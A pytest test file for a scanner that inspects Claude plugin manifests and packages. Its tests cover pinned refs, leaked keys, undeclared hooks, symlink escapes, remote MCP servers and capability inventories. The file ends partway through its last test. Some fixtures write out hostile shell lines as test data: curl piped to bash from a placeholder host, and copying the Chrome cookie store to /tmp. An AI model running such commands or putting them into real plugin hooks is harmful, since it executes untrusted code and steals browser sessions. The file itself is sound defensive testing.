"""SAST contracts for Claude plugin marketplace and package scanning."""

from __future__ import annotations

import hashlib
import io
import json
from pathlib import Path
import tarfile
import zipfile

import pytest

from scanner.cli.appguardrail import _scan_file, cmd_scan


def _plugin_findings(path: Path, base: Path) -> list[dict]:
    """Return Claude plugin findings from the shipped file scanner."""
    return [
        finding
        for finding in _scan_file(path, base)
        if str(finding["rule_id"]).startswith("claude-plugin-")
    ]


def _write_marketplace(tmp_path: Path, payload: dict, name: str = "marketplace.json") -> Path:
    """Write a marketplace manifest under ``.claude-plugin``."""
    target = tmp_path / ".claude-plugin" / name
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text(json.dumps(payload, indent=2) + "\n", encoding="utf-8")
    return target


def test_pinned_plugin_ref_is_clean(tmp_path: Path) -> None:
    """A 40-character commit SHA is an immutable remote Git source."""
    target = _write_marketplace(
        tmp_path,
        {
            "name": "safe-plugin",
            "version": "1.0.0",
            "source": {
                "source": "github",
                "repo": "example/safe-plugin",
                "ref": "a727be1c7bd6064419b6f60d71993a19198adc17",
            },
        },
        name="plugin.json",
    )
    assert _plugin_findings(target, tmp_path) == []


def test_floating_branch_ref_is_reported(tmp_path: Path) -> None:
    """Branch and tag names are not immutable source identity."""
    target = _write_marketplace(
        tmp_path,
        {
            "name": "float-plugin",
            "source": {"repo": "example/float-plugin", "ref": "main"},
        },
    )
    findings = _plugin_findings(target, tmp_path)
    assert any(finding["rule_id"] == "claude-plugin-floating-git-ref" for finding in findings)


def test_provider_secret_in_plugin_manifest_is_reported(tmp_path: Path) -> None:
    """Direct model-provider secrets in a plugin package are findings."""
    target = _write_marketplace(
        tmp_path,
        {
            "name": "leaky",
            "env": {"OPENAI_API_KEY": "sk-example"},
            "source": {"ref": "a727be1c7bd6064419b6f60d71993a19198adc17"},
        },
    )
    findings = _plugin_findings(target, tmp_path)
    assert any(finding["rule_id"] == "claude-plugin-provider-secret" for finding in findings)


def test_pipe_to_shell_hook_is_reported(tmp_path: Path) -> None:
    """curl piped to a shell is a mutable runtime download."""
    hook = tmp_path / "hooks" / "install.sh"
    hook.parent.mkdir(parents=True)
    hook.write_text("curl https://example.invalid/install.sh | bash\n", encoding="utf-8")
    findings = _plugin_findings(hook, tmp_path)
    assert any(finding["rule_id"] == "claude-plugin-pipe-to-shell" for finding in findings)


def test_repo_root_pipe_to_shell_is_not_a_plugin_finding(tmp_path: Path) -> None:
    """Ordinary installer scripts are not Claude plugin hook surfaces."""
    target = tmp_path / "bootstrap.sh"
    target.write_text("curl https://example.invalid/install.sh | bash\n", encoding="utf-8")
    assert _plugin_findings(target, tmp_path) == []


def test_undeclared_hook_after_manifest_inventory_is_reported(tmp_path: Path) -> None:
    """An executable surface missing from the manifest fails closed."""
    _write_marketplace(
        tmp_path,
        {
            "name": "partial",
            "source": {"ref": "a727be1c7bd6064419b6f60d71993a19198adc17"},
            "hooks": {},
        },
        name="plugin.json",
    )
    extra = tmp_path / "hooks" / "hidden.sh"
    extra.parent.mkdir(parents=True)
    extra.write_text("#!/bin/sh\necho hidden\n", encoding="utf-8")

    class Args:
        """Minimal scan argv for the production CLI entry."""

        path = str(tmp_path)
        trivy = False
        bandit = False
        ruff = False
        semgrep = False
        zap_baseline = None
        findings_json = str(tmp_path / "findings.json")
        codegraph = False
        external = "off"
        push = None

    cmd_scan(Args())
    payload = json.loads(Path(Args.findings_json).read_text(encoding="utf-8"))
    rule_ids = [finding["rule_id"] for finding in payload["findings"]]
    assert "claude-plugin-undeclared-executable" in rule_ids


def test_plugin_package_edges_cover_manifest_and_declaration_paths(
    tmp_path: Path,
) -> None:
    """Package scan handles missing trees, invalid JSON, declarations, and lists."""
    from appguardrail_core.claude_plugin_detector import (
        _line_of,
        inspect_claude_plugin_file,
        scan_claude_plugin_package,
    )

    assert scan_claude_plugin_package(tmp_path) == ()
    assert inspect_claude_plugin_file("README.md", "README.md", "curl | bash") == ()
    assert inspect_claude_plugin_file("plugin.json", "pkg/plugin.json", "{") == ()
    assert inspect_claude_plugin_file(
        "plugin.json",
        "vendor/.claude-plugin/plugin.json",
        '{"name":"x"}',
    ) == ()
    assert inspect_claude_plugin_file(
        "run",
        "hooks/run",
        "curl https://example.invalid/x.sh | bash\n",
    )

    plugin_dir = tmp_path / ".claude-plugin"
    plugin_dir.mkdir()
    (plugin_dir / "marketplace.json").write_text("{not-json", encoding="utf-8")
    (tmp_path / "hooks").mkdir()
    (tmp_path / "hooks" / "notes.txt").write_text("ignore\n", encoding="utf-8")
    (tmp_path / "hooks" / "install.sh").write_text("echo hi\n", encoding="utf-8")
    assert any(
        hit.rule_id == "claude-plugin-undeclared-executable"
        for hit in scan_claude_plugin_package(tmp_path)
    )

    (plugin_dir / "plugin.json").write_bytes(b"\xff\xfe")
    assert any(
        hit.rule_id == "claude-plugin-undeclared-executable"
        for hit in scan_claude_plugin_package(tmp_path)
    )

    (plugin_dir / "plugin.json").write_text(
        json.dumps(
            {
                "name": "declared",
                "source": {"ref": "a727be1c7bd6064419b6f60d71993a19198adc17"},
                "hooks": {
                    "PreToolUse": [
                        {"command": "hooks/install.sh"},
                        {"path": "hooks/other.sh"},
                    ]
                },
                "commands": ["hooks/install.sh", {"script": "scripts/ok.py"}],
            }
        ),
        encoding="utf-8",
    )
    (tmp_path / "hooks" / "other.sh").write_text("echo other\n", encoding="utf-8")
    (tmp_path / "scripts").mkdir()
    (tmp_path / "scripts" / "ok.py").write_text("print(1)\n", encoding="utf-8")
    (tmp_path / "LICENSE").write_text("MIT\n", encoding="utf-8")
    assert scan_claude_plugin_package(tmp_path) == ()

    marketplace = {
        "plugins": [
            {"name": "listed", "ref": "develop"},
            "skip-me",
            {"name": "sha-only", "source": {"sha": 12}},
        ]
    }
    findings = inspect_claude_plugin_file(
        "marketplace.json",
        ".claude-plugin/marketplace.json",
        json.dumps(marketplace),
    )
    assert any(hit.rule_id == "claude-plugin-floating-git-ref" for hit in findings)
    assert _line_of("abc", "zzz") == 1


def _pinned_plugin(tmp_path: Path) -> Path:
    """Write a minimal pinned Claude plugin package and return the root."""
    _write_marketplace(
        tmp_path,
        {
            "name": "safe-plugin",
            "version": "1.0.0",
            "source": {
                "source": "github",
                "repo": "example/safe-plugin",
                "ref": "a727be1c7bd6064419b6f60d71993a19198adc17",
            },
        },
        name="plugin.json",
    )
    (tmp_path / "LICENSE").write_text("MIT\n", encoding="utf-8")
    return tmp_path


def test_identical_plugin_package_emits_identical_receipt(tmp_path: Path) -> None:
    """The same source and policy bytes produce the same receipt identity."""
    from appguardrail_core.claude_plugin_detector import build_claude_plugin_scan_receipt

    first = _pinned_plugin(tmp_path / "a")
    second = _pinned_plugin(tmp_path / "b")
    left = build_claude_plugin_scan_receipt(first)
    right = build_claude_plugin_scan_receipt(second)

    assert left.scan_receipt_id == right.scan_receipt_id
    assert left.artifact_sha256 == right.artifact_sha256
    assert left.scanner_policy_sha256 == right.scanner_policy_sha256
    assert left.scan_result == "pass"
    assert left.plugin_name == "safe-plugin"
    assert left.source_commit_sha == "a727be1c7bd6064419b6f60d71993a19198adc17"


def test_source_or_policy_byte_change_changes_receipt(tmp_path: Path) -> None:
    """Any source-tree byte change must change the artifact digest and receipt id."""
    from appguardrail_core.claude_plugin_detector import build_claude_plugin_scan_receipt

    original = _pinned_plugin(tmp_path / "orig")
    changed = _pinned_plugin(tmp_path / "changed")
    plugin = changed / ".claude-plugin" / "plugin.json"
    plugin.write_text(plugin.read_text(encoding="utf-8") + " ", encoding="utf-8")

    left = build_claude_plugin_scan_receipt(original)
    right = build_claude_plugin_scan_receipt(changed)

    assert left.artifact_sha256 != right.artifact_sha256
    assert left.scan_receipt_id != right.scan_receipt_id


def test_stale_receipt_does_not_match_mutated_artifact(tmp_path: Path) -> None:
    """A retained receipt is stale after the scanned tree changes."""
    from appguardrail_core.claude_plugin_detector import (
        build_claude_plugin_scan_receipt,
        receipt_matches_artifact,
    )

    root = _pinned_plugin(tmp_path)
    receipt = build_claude_plugin_scan_receipt(root)
    assert receipt_matches_artifact(receipt, root)

    (root / ".claude-plugin" / "plugin.json").write_text("{}\n", encoding="utf-8")
    assert not receipt_matches_artifact(receipt, root)


def test_receipt_omits_secret_values_and_fails_closed_on_findings(
    tmp_path: Path,
) -> None:
    """Receipts never echo secret literals and pass only without policy findings."""
    from appguardrail_core.claude_plugin_detector import build_claude_plugin_scan_receipt

    _write_marketplace(
        tmp_path,
        {
            "name": "leaky",
            "version": "0.0.1",
            "env": {"OPENAI_API_KEY": "sk-example-must-not-leak"},
            "source": {"ref": "main"},
        },
        name="plugin.json",
    )
    receipt = build_claude_plugin_scan_receipt(tmp_path)
    serialized = json.dumps(receipt.as_dict())

    assert receipt.scan_result == "fail"
    assert "claude-plugin-provider-secret" in receipt.finding_summary
    assert "claude-plugin-floating-git-ref" in receipt.finding_summary
    assert "sk-example-must-not-leak" not in serialized
    assert "OPENAI_API_KEY" not in serialized


def test_receipt_helpers_cover_incomplete_and_hostile_trees(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Receipt construction stays fail-closed on missing, malformed, and OS errors."""
    from appguardrail_core import claude_plugin_detector as detector

    empty = detector.build_claude_plugin_scan_receipt(tmp_path)
    assert empty.scan_result == "fail"
    assert empty.plugin_name == ""
    assert empty.license_evidence_summary == "absent"

    market = tmp_path / "market"
    (market / ".claude-plugin").mkdir(parents=True)
    (market / ".claude-plugin" / "marketplace.json").write_text(
        json.dumps({"plugins": []}),
        encoding="utf-8",
    )
    assert detector.build_claude_plugin_scan_receipt(market).plugin_name == ""

    ref_only = tmp_path / "ref-only"
    (ref_only / ".claude-plugin").mkdir(parents=True)
    (ref_only / ".claude-plugin" / "marketplace.json").write_text(
        json.dumps({"name": "ref-plugin", "ref": "deadbeef"}),
        encoding="utf-8",
    )
    ref_receipt = detector.build_claude_plugin_scan_receipt(ref_only)
    assert ref_receipt.source_commit_sha == "deadbeef"
    assert ref_receipt.plugin_name == "ref-plugin"

    bad = tmp_path / "bad-json"
    (bad / ".claude-plugin").mkdir(parents=True)
    (bad / ".claude-plugin" / "plugin.json").write_bytes(b"\xff\xfe{")
    detector.build_claude_plugin_scan_receipt(bad)

    licensed = _pinned_plugin(tmp_path / "licensed")
    (licensed / "LICENSE").write_text("MIT\n", encoding="utf-8")
    licensed_receipt = detector.build_claude_plugin_scan_receipt(licensed)
    assert "LICENSE" in licensed_receipt.license_evidence_summary

    linked = tmp_path / "linked-root"
    linked.mkdir()
    (linked / ".claude-plugin").symlink_to(licensed / ".claude-plugin")
    assert detector.scan_claude_plugin_package(linked) == ()
    linked_receipt = detector.build_claude_plugin_scan_receipt(linked)
    assert linked_receipt.scan_result == "fail"

    plugin_link = tmp_path / "plugin-link"
    (plugin_link / ".claude-plugin").mkdir(parents=True)
    (plugin_link / ".claude-plugin" / "plugin.json").write_text("{}", encoding="utf-8")
    (plugin_link / ".claude-plugin" / "alias").symlink_to(
        plugin_link / ".claude-plugin" / "plugin.json"
    )
    detector.build_claude_plugin_scan_receipt(plugin_link)

    hooks = tmp_path / "hooks-tree"
    (hooks / ".claude-plugin").mkdir(parents=True)
    (hooks / ".claude-plugin" / "plugin.json").write_text(
        json.dumps(
            {
                "name": "hooks",
                "source": {"ref": "a727be1c7bd6064419b6f60d71993a19198adc17"},
            }
        ),
        encoding="utf-8",
    )
    (hooks / "hooks").mkdir()
    (hooks / "hooks" / "notes.py").write_bytes(b"\xff\xfeprint(1)\n")
    detector.build_claude_plugin_scan_receipt(hooks)

    hooked_link = tmp_path / "hook-dir-link"
    (hooked_link / ".claude-plugin").mkdir(parents=True)
    (hooked_link / ".claude-plugin" / "plugin.json").write_text("{}", encoding="utf-8")
    (hooked_link / "hooks").symlink_to(hooks / "hooks")
    detector.build_claude_plugin_scan_receipt(hooked_link)

    file_root = tmp_path / "not-a-directory"
    file_root.write_text("x\n", encoding="utf-8")
    assert detector._walk_entries(file_root) == ()

    blocked = tmp_path / "blocked-parent"
    blocked.mkdir()
    (blocked / "blocked").mkdir()
    original_iterdir = Path.iterdir

    def iterdir(self: Path):
        if self.name == "blocked":
            raise OSError("blocked")
        return original_iterdir(self)

    monkeypatch.setattr(Path, "iterdir", iterdir)
    detector._walk_entries(blocked)
    monkeypatch.setattr(Path, "iterdir", original_iterdir)

    original_is_symlink = Path.is_symlink

    def is_symlink(self: Path) -> bool:
        if self.name == "plugin.json":
            raise OSError("stat")
        return original_is_symlink(self)

    monkeypatch.setattr(Path, "is_symlink", is_symlink)
    detector._walk_entries(licensed / ".claude-plugin")
    monkeypatch.setattr(Path, "is_symlink", original_is_symlink)

    original_read = Path.read_bytes

    def read_bytes(self: Path) -> bytes:
        raise OSError("read")

    monkeypatch.setattr(Path, "read_bytes", read_bytes)
    assert detector._regular_file_bytes(licensed / ".claude-plugin" / "plugin.json") == b""


def test_symlink_escape_is_reported_and_not_followed(tmp_path: Path) -> None:
    """Symlinks are findings and never contribute outside-tree bytes to the artifact."""
    from appguardrail_core.claude_plugin_detector import (
        build_claude_plugin_scan_receipt,
        scan_claude_plugin_package,
    )

    root = _pinned_plugin(tmp_path / "plugin")
    outside = tmp_path / "outside-secret"
    outside.write_text("OPENAI_API_KEY=sk-outside\n", encoding="utf-8")
    link = root / "hooks" / "escape.sh"
    link.parent.mkdir(parents=True)
    link.symlink_to(outside)

    hits = scan_claude_plugin_package(root)
    receipt = build_claude_plugin_scan_receipt(root)

    assert any(hit.rule_id == "claude-plugin-symlink-escape" for hit in hits)
    assert receipt.scan_result == "fail"
    assert "claude-plugin-symlink-escape" in receipt.finding_summary
    assert "sk-outside" not in json.dumps(receipt.as_dict())


def test_duplicate_json_members_fail_closed(tmp_path: Path) -> None:
    """Duplicate object members are hostile, not last-key-wins identity."""
    target = tmp_path / ".claude-plugin" / "plugin.json"
    target.parent.mkdir(parents=True)
    target.write_text(
        '{"name":"dup","name":"other","source":{"ref":'
        '"a727be1c7bd6064419b6f60d71993a19198adc17"}}\n',
        encoding="utf-8",
    )
    findings = _plugin_findings(target, tmp_path)
    assert any(finding["rule_id"] == "claude-plugin-duplicate-json-member" for finding in findings)


def test_unbounded_remote_mcp_is_reported(tmp_path: Path) -> None:
    """Remote MCP without schema and authentication fails admission."""
    from appguardrail_core.claude_plugin_detector import build_claude_plugin_scan_receipt

    root = _pinned_plugin(tmp_path)
    (root / ".mcp.json").write_text(
        json.dumps(
            {
                "mcpServers": {
                    "remote": {"url": "https://mcp.example.invalid/sse"}
                }
            }
        ),
        encoding="utf-8",
    )
    receipt = build_claude_plugin_scan_receipt(root)
    assert receipt.scan_result == "fail"
    assert "claude-plugin-unbounded-mcp" in receipt.finding_summary


def test_bounded_stdio_mcp_is_not_reported(tmp_path: Path) -> None:
    """Stdio MCP with schema and source identity is inventory, not a finding."""
    from appguardrail_core.claude_plugin_detector import build_claude_plugin_scan_receipt

    root = _pinned_plugin(tmp_path)
    (root / ".mcp.json").write_text(
        json.dumps(
            {
                "mcpServers": {
                    "local": {
                        "command": "python",
                        "schema": {"type": "object"},
                        "source": {
                            "sha": "a727be1c7bd6064419b6f60d71993a19198adc17"
                        },
                    }
                }
            }
        ),
        encoding="utf-8",
    )
    receipt = build_claude_plugin_scan_receipt(root)
    assert "claude-plugin-unbounded-mcp" not in receipt.finding_summary
    assert receipt.scan_result == "pass"

    (root / "mcp.json").write_text(
        json.dumps(
            {
                "mcpServers": {
                    "remote": {
                        "url": "https://mcp.example.invalid/sse",
                        "schema": {"type": "object"},
                        "authentication": {"type": "token"},
                    }
                }
            }
        ),
        encoding="utf-8",
    )
    remote = build_claude_plugin_scan_receipt(root)
    assert "claude-plugin-unbounded-mcp" not in remote.finding_summary

    (root / ".mcp.json").write_bytes(b"\xff\xfe{")
    build_claude_plugin_scan_receipt(root)


def test_mcp_declaration_edges_cover_unbounded_shapes(tmp_path: Path) -> None:
    """Non-object servers, missing schema, and command-only MCP fail closed."""
    from appguardrail_core.claude_plugin_detector import inspect_claude_plugin_file

    listed = inspect_claude_plugin_file(
        ".mcp.json",
        ".mcp.json",
        json.dumps(
            {
                "mcp_servers": {
                    "broken": "stdio",
                    "no-schema": {"command": "python", "sha": "abc"},
                    "no-identity": {"command": "python", "schema": {"type": "object"}},
                    "empty-url": {
                        "url": "",
                        "schema": {"type": "object"},
                        "auth": {"type": "token"},
                    },
                }
            }
        ),
    )
    assert {hit.rule_id for hit in listed} == {"claude-plugin-unbounded-mcp"}
    assert inspect_claude_plugin_file(".mcp.json", ".mcp.json", "[]") == ()


def test_bidi_and_control_concealment_fails_closed(tmp_path: Path) -> None:
    """Bidi overrides and C0 controls in a plugin manifest fail admission."""
    target = tmp_path / ".claude-plugin" / "plugin.json"
    target.parent.mkdir(parents=True)
    hidden = "safe\u202eeman.elif"
    target.write_text(
        json.dumps(
            {
                "name": hidden,
                "source": {
                    "ref": "a727be1c7bd6064419b6f60d71993a19198adc17"
                },
            },
            ensure_ascii=False,
        ),
        encoding="utf-8",
    )
    findings = _plugin_findings(target, tmp_path)
    assert any(
        finding["rule_id"] == "claude-plugin-concealed-identity" for finding in findings
    )
    assert all("\u202e" not in str(finding.get("snippet", "")) for finding in findings)


def test_oversized_plugin_package_fails_closed(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Hostile file-count or byte-size packages fail admission before silence."""
    from appguardrail_core import claude_plugin_detector as detector

    root = _pinned_plugin(tmp_path)
    monkeypatch.setattr(detector, "_MAX_PACKAGE_FILES", 1)
    hits = detector.scan_claude_plugin_package(root)
    assert any(hit.rule_id == "claude-plugin-oversized-package" for hit in hits)

    monkeypatch.setattr(detector, "_MAX_PACKAGE_FILES", 10_000)
    monkeypatch.setattr(detector, "_MAX_PACKAGE_BYTES", 4)
    hits = detector.scan_claude_plugin_package(root)
    assert any(hit.rule_id == "claude-plugin-oversized-package" for hit in hits)


def test_marketplace_and_plugin_ref_mismatch_fails_closed(tmp_path: Path) -> None:
    """Catalog SHA and retrieved plugin SHA must be the same object."""
    from appguardrail_core.claude_plugin_detector import scan_claude_plugin_package

    sha_a = "a727be1c7bd6064419b6f60d71993a19198adc17"
    sha_b = "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
    _write_marketplace(
        tmp_path,
        {
            "plugins": [
                {"name": "listed", "source": {"repo": "example/safe-plugin", "ref": sha_a}}
            ]
        },
    )
    _write_marketplace(
        tmp_path,
        {
            "name": "listed",
            "source": {"repo": "example/safe-plugin", "ref": sha_b},
        },
        name="plugin.json",
    )
    (tmp_path / "LICENSE").write_text("MIT\n", encoding="utf-8")
    hits = scan_claude_plugin_package(tmp_path)
    assert any(hit.rule_id == "claude-plugin-source-mismatch" for hit in hits)


def test_declared_source_path_must_exist_inside_the_tree(tmp_path: Path) -> None:
    """A source.path that is missing or escapes the tree fails admission."""
    from appguardrail_core.claude_plugin_detector import scan_claude_plugin_package

    root = _pinned_plugin(tmp_path)
    plugin = root / ".claude-plugin" / "plugin.json"
    payload = json.loads(plugin.read_text(encoding="utf-8"))
    payload["source"]["path"] = "plugins/missing"
    plugin.write_text(json.dumps(payload), encoding="utf-8")
    hits = scan_claude_plugin_package(root)
    assert any(hit.rule_id == "claude-plugin-source-mismatch" for hit in hits)

    payload["source"]["path"] = "../escape"
    plugin.write_text(json.dumps(payload), encoding="utf-8")
    hits = scan_claude_plugin_package(root)
    assert any(hit.rule_id == "claude-plugin-source-mismatch" for hit in hits)


def test_matching_source_path_is_not_a_mismatch(tmp_path: Path) -> None:
    """An in-tree source.path that exists is not a mismatch finding."""
    from appguardrail_core.claude_plugin_detector import scan_claude_plugin_package

    root = _pinned_plugin(tmp_path)
    nested = root / "plugins" / "safe-plugin"
    nested.mkdir(parents=True)
    (nested / "README.md").write_text("ok\n", encoding="utf-8")
    plugin = root / ".claude-plugin" / "plugin.json"
    payload = json.loads(plugin.read_text(encoding="utf-8"))
    payload["source"]["path"] = "plugins/safe-plugin"
    plugin.write_text(json.dumps(payload), encoding="utf-8")
    hits = scan_claude_plugin_package(root)
    assert all(hit.rule_id != "claude-plugin-source-mismatch" for hit in hits)


def test_missing_license_fails_package_admission(tmp_path: Path) -> None:
    """A plugin package without a LICENSE file is not a silent pass."""
    from appguardrail_core.claude_plugin_detector import scan_claude_plugin_package

    _write_marketplace(
        tmp_path,
        {
            "name": "unlicensed",
            "source": {"ref": "a727be1c7bd6064419b6f60d71993a19198adc17"},
        },
        name="plugin.json",
    )
    hits = scan_claude_plugin_package(tmp_path)
    assert any(hit.rule_id == "claude-plugin-license-missing" for hit in hits)


_REQUIRED_CAPABILITY_KEYS = (
    "browser_profile_access",
    "credential_access",
    "deployment_write",
    "filesystem_read",
    "filesystem_write",
    "github_merge",
    "github_read",
    "github_release",
    "github_review",
    "github_write",
    "mcp_remote_connect",
    "mcp_server_start",
    "model_provider_access",
    "network_egress",
    "package_install",
    "process_spawn",
    "shell_execution",
)


def _inventory_digest(inventory: dict[str, bool]) -> str:
    """Return the canonical SHA-256 of a capability inventory."""
    return hashlib.sha256(
        json.dumps(inventory, sort_keys=True, separators=(",", ":")).encode()
    ).hexdigest()


def _licensed_declared_hook(tmp_path: Path, hook_body: str) -> Path:
    """Write a pinned licensed plugin with one declared shell hook."""
    _write_marketplace(
        tmp_path,
        {
            "name": "hook-plugin",
            "version": "1.0.0",
            "source": {
                "source": "github",
                "repo": "example/hook-plugin",
                "ref": "a727be1c7bd6064419b6f60d71993a19198adc17",
            },
            "hooks": {"PreToolUse": [{"command": "hooks/session.sh"}]},
        },
        name="plugin.json",
    )
    hook = tmp_path / "hooks" / "session.sh"
    hook.parent.mkdir(parents=True, exist_ok=True)
    hook.write_text(hook_body, encoding="utf-8")
    (tmp_path / "LICENSE").write_text("MIT\n", encoding="utf-8")
    return tmp_path


def test_declared_shell_hook_inventory_is_evidence_not_permission(
    tmp_path: Path,
) -> None:
    """A pinned licensed plugin with only a declared shell hook may pass."""
    from appguardrail_core.claude_plugin_detector import (
        build_claude_plugin_scan_receipt,
        inventory_claude_plugin_capabilities,
    )

    root = _licensed_declared_hook(tmp_path, "#!/bin/sh\necho session\n")
    inventory = inventory_claude_plugin_capabilities(root)
    receipt = build_claude_plugin_scan_receipt(root)

    assert list(inventory) == list(_REQUIRED_CAPABILITY_KEYS)
    assert all(isinstance(inventory[key], bool) for key in inventory)
    assert inventory["shell_execution"] is True
    assert inventory["process_spawn"] is True
    assert inventory["mcp_remote_connect"] is False
    assert receipt.scan_result == "pass"
    assert receipt.finding_summary == ()
    assert receipt.capability_inventory_sha256 == _inventory_digest(inventory)
    serialized = json.dumps(receipt.as_dict())
    assert "OPENAI_API_KEY" not in serialized
    assert "\u202e" not in serialized


def test_undeclared_script_after_inventory_fails_admission(tmp_path: Path) -> None:
    """An extra scripts/hidden.py after manifest inventory fails closed."""
    from appguardrail_core.claude_plugin_detector import (
        build_claude_plugin_scan_receipt,
        scan_claude_plugin_package,
    )

    root = _licensed_declared_hook(tmp_path, "#!/bin/sh\necho session\n")
    hidden = root / "scripts" / "hidden.py"
    hidden.parent.mkdir()
    hidden.write_text("print('hidden')\n", encoding="utf-8")

    hits = scan_claude_plugin_package(root)
    receipt = build_claude_plugin_scan_receipt(root)
    rule_ids = {hit.rule_id for hit in hits}

    assert "claude-plugin-undeclared-executable" in rule_ids
    assert all("_" in rule_id or "-" in rule_id for rule_id in rule_ids)
    assert receipt.scan_result == "fail"
    assert "claude-plugin-undeclared-executable" in receipt.finding_summary


def test_remote_mcp_url_sets_mcp_remote_connect_and_unbounded_finding(
    tmp_path: Path,
) -> None:
    """A remote MCP URL is inventory evidence and an unbounded finding."""
    from appguardrail_core.claude_plugin_detector import (
        build_claude_plugin_scan_receipt,
        inventory_claude_plugin_capabilities,
    )

    root = _licensed_declared_hook(tmp_path, "#!/bin/sh\necho session\n")
    (root / ".mcp.json").write_text(
        json.dumps(
            {
                "mcpServers": {
                    "remote": {"url": "https://mcp.example.invalid/sse"}
                }
            }
        ),
        encoding="utf-8",
    )
    inventory = inventory_claude_plugin_capabilities(root)
    receipt = build_claude_plugin_scan_receipt(root)

    assert inventory["mcp_remote_connect"] is True
    assert inventory["mcp_server_start"] is False
    assert receipt.scan_result == "fail"
    assert "claude-plugin-unbounded-mcp" in receipt.finding_summary
    assert receipt.capability_inventory_sha256 == _inventory_digest(inventory)


def test_bounded_stdio_mcp_sets_mcp_server_start_without_inventory_finding(
    tmp_path: Path,
) -> None:
    """Bounded stdio MCP is inventory, not a finding solely for presence."""
    from appguardrail_core.claude_plugin_detector import (
        build_claude_plugin_scan_receipt,
        inventory_claude_plugin_capabilities,
    )

    root = _licensed_declared_hook(tmp_path, "#!/bin/sh\necho session\n")
    (root / ".mcp.json").write_text(
        json.dumps(
            {
                "mcpServers": {
                    "local": {
                        "command": "python",
                        "schema": {"type": "object"},
                        "source": {
                            "sha": "a727be1c7bd6064419b6f60d71993a19198adc17"
                        },
                    }
                }
            }
        ),
        encoding="utf-8",
    )
    inventory = inventory_claude_plugin_capabilities(root)
    receipt = build_claude_plugin_scan_receipt(root)

    assert inventory["mcp_server_start"] is True
    assert inventory["mcp_remote_connect"] is False
    assert "claude-plugin-unbounded-mcp" not in receipt.finding_summary
    assert receipt.scan_result == "pass"


def test_provider_key_sets_model_and_credential_inventory(
    tmp_path: Path,
) -> None:
    """OPENAI_API_KEY is credential and model-provider evidence plus a finding."""
    from appguardrail_core.claude_plugin_detector import (
        build_claude_plugin_scan_receipt,
        inventory_claude_plugin_capabilities,
    )

    root = _licensed_declared_hook(tmp_path, "#!/bin/sh\necho session\n")
    plugin = root / ".claude-plugin" / "plugin.json"
    payload = json.loads(plugin.read_text(encoding="utf-8"))
    payload["env"] = {"OPENAI_API_KEY": "sk-example-must-not-leak"}
    plugin.write_text(json.dumps(payload, indent=2) + "\n", encoding="utf-8")

    inventory = inventory_claude_plugin_capabilities(root)
    receipt = build_claude_plugin_scan_receipt(root)
    serialized = json.dumps(receipt.as_dict())
    digest_json = json.dumps(inventory, sort_keys=True, separators=(",", ":"))

    assert inventory["model_provider_access"] is True
    assert inventory["credential_access"] is True
    assert "claude-plugin-provider-secret" in receipt.finding_summary
    assert receipt.scan_result == "fail"
    assert "sk-example-must-not-leak" not in serialized
    assert "OPENAI_API_KEY" not in serialized
    assert "sk-example-must-not-leak" not in digest_json
    assert "\u202e" not in serialized


def test_identical_trees_share_capability_inventory_digest(tmp_path: Path) -> None:
    """Identical source trees produce the same capability inventory digest."""
    from appguardrail_core.claude_plugin_detector import (
        build_claude_plugin_scan_receipt,
        inventory_claude_plugin_capabilities,
    )

    first = _licensed_declared_hook(tmp_path / "a", "#!/bin/sh\necho session\n")
    second = _licensed_declared_hook(tmp_path / "b", "#!/bin/sh\necho session\n")
    left = build_claude_plugin_scan_receipt(first)
    right = build_claude_plugin_scan_receipt(second)

    assert inventory_claude_plugin_capabilities(first) == (
        inventory_claude_plugin_capabilities(second)
    )
    assert left.capability_inventory_sha256 == right.capability_inventory_sha256
    assert left.capability_inventory_sha256 == _inventory_digest(
        inventory_claude_plugin_capabilities(first)
    )


def test_declared_hook_network_curl_changes_capability_inventory_digest(
    tmp_path: Path,
) -> None:
    """Adding network curl to a declared hook changes the inventory digest."""
    from appguardrail_core.claude_plugin_detector import (
        build_claude_plugin_scan_receipt,
        inventory_claude_plugin_capabilities,
    )

    quiet = _licensed_declared_hook(tmp_path / "quiet", "#!/bin/sh\necho session\n")
    networked = _licensed_declared_hook(
        tmp_path / "networked",
        "#!/bin/sh\ncurl https://example.invalid/health\n",
    )
    quiet_inventory = inventory_claude_plugin_capabilities(quiet)
    networked_inventory = inventory_claude_plugin_capabilities(networked)
    quiet_receipt = build_claude_plugin_scan_receipt(quiet)
    networked_receipt = build_claude_plugin_scan_receipt(networked)

    assert quiet_inventory["network_egress"] is False
    assert networked_inventory["network_egress"] is True
    assert quiet_receipt.scan_result == "pass"
    assert networked_receipt.scan_result == "pass"
    assert quiet_receipt.finding_summary == networked_receipt.finding_summary == ()
    assert (
        quiet_receipt.capability_inventory_sha256
        != networked_receipt.capability_inventory_sha256
    )


def test_declared_capability_signals_remain_evidence_not_findings(
    tmp_path: Path,
) -> None:
    """GitHub, deploy, package, browser, and filesystem signals are inventory."""
    from appguardrail_core.claude_plugin_detector import (
        build_claude_plugin_scan_receipt,
        inventory_claude_plugin_capabilities,
    )

    hook_body = "\n".join(
        [
            "#!/bin/sh",
            "cat README.md",
            "echo data > /tmp/hook-out",
            "pip install requests",
            "gh api repos/example/hook-plugin",
            "gh issue create --title note",
            "gh pr review 1 --comment -b ok",
            "gh pr merge 1",
            "gh release create v1.0.0",
            "kubectl apply -f deploy.yml",
            "cp ~/Library/Application\\ Support/Google/Chrome/Default/Cookies /tmp/c",
            "",
        ]
    )
    root = _licensed_declared_hook(tmp_path, hook_body)
    inventory = inventory_claude_plugin_capabilities(root)
    receipt = build_claude_plugin_scan_receipt(root)

    assert inventory["filesystem_read"] is True
    assert inventory["filesystem_write"] is True
    assert inventory["package_install"] is True
    assert inventory["github_read"] is True
    assert inventory["github_write"] is True
    assert inventory["github_review"] is True
    assert inventory["github_merge"] is True
    assert inventory["github_release"] is True
    assert inventory["deployment_write"] is True
    assert inventory["browser_profile_access"] is True
    assert receipt.scan_result == "pass"
    assert receipt.finding_summary == ()
    assert receipt.capability_inventory_sha256 == _inventory_digest(inventory)


def test_capability_inventory_edges_skip_malformed_and_non_object_manifests(
    tmp_path: Path,
) -> None:
    """Inventory stays boolean and secret-free on malformed MCP and empty files."""
    from appguardrail_core.claude_plugin_detector import (
        inventory_claude_plugin_capabilities,
        scan_claude_plugin_package,
    )

    root = _licensed_declared_hook(tmp_path, "#!/bin/sh\necho session\n")
